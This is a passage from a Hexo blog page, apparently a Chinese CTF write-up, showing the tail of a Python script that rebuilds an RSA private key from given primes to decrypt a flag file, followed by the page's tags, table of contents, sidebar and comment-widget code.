class="number">120704675500260151469966649988822073439735620657157178605185111090847776896412605616399851623640833537748026036394147889121948427362807952170087685331046616222708535122650963466159965155206404582900022412695010039292107108659626384086949151937712914513006713261769248399597038840377613425426477030974588859983</span></span><br><span class="line">q = <span class="number">157194667273395078091690715359649373226005247729684564897233925620451263163534476559233007477874770144949074471296577678270820453203784261690001421933906316488224081275610737920296334697466445787310072301759253431687655435272535953996103257268055911344285357880348486067423090573148921357811044304231614285373</span></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phin)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line">private_key = RSA.construct((<span class="built_in">int</span>(n), <span class="built_in">int</span>(e), <span class="built_in">int</span>(d), <span class="built_in">int</span>(p), <span class="built_in">int</span>(q)))</span><br><span class="line">decipher = PKCS1_OAEP.new(private_key)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    cipher = f.read()</span><br><span class="line"><span class="built_in">print</span>(decipher.decrypt(cipher))</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E8%A5%BF%E8%97%8F/" rel="tag"># 西藏</a>
+              <a href="/tags/%E7%8E%84%E7%9B%BE%E7%8F%A0%E5%B3%B0/" rel="tag"># 玄盾珠峰</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/09/12/2024%E8%A5%BF%E8%97%8F%E8%87%AA%E6%B2%BB%E5%8C%BA%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/" rel="prev" title="2024西藏自治区职业技能大赛-网络安全个人赛WP">
+      <i class="fa fa-chevron-left"></i> 2024西藏自治区职业技能大赛-网络安全个人赛WP
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#urlencode%EF%BC%88done%EF%BC%89"><span class="nav-number">1.1.</span> <span class="nav-text">urlencode（done）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">1.2.</span> <span class="nav-text">2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#hellokity%EF%BC%88done%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">hellokity（done）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#analyse%EF%BC%88done%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">analyse（done）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#icmp"><span class="nav-number">2.2.1.</span> <span class="nav-text">icmp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dns"><span class="nav-number">2.2.2.</span> <span class="nav-text">dns</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#http"><span class="nav-number">2.2.3.</span> <span class="nav-text">http</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-number">3.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#questionnaire-investigation-v2%EF%BC%88done%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">questionnaire_investigation_v2（done）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">4.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ad%EF%BC%88done%EF%BC%89"><span class="nav-number">4.1.</span> <span class="nav-text">ad（done）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crazyencode"><span class="nav-number">4.2.</span> <span class="nav-text">Crazyencode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BF%BB%E8%BD%AC%EF%BC%88done%EF%BC%89"><span class="nav-number">5.1.</span> <span class="nav-text">翻转（done）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xor%EF%BC%88done%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">xor（done）</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Paulownia</p>
+  <div class="site-description" itemprop="description">记录知识,分享内容</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BMLovePanda" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BMLovePanda" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:zhrui06@gmail.com" title="E-Mail → mailto:zhrui06@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Paulownia</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'ht1Spwh002m1TkaTLxmGorwj-gzGzoHsz',
+      appKey     : 'aqaYLOhc4JZ0YM4fCg3xoRtO',
+      placeholder: "写点什么吧",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
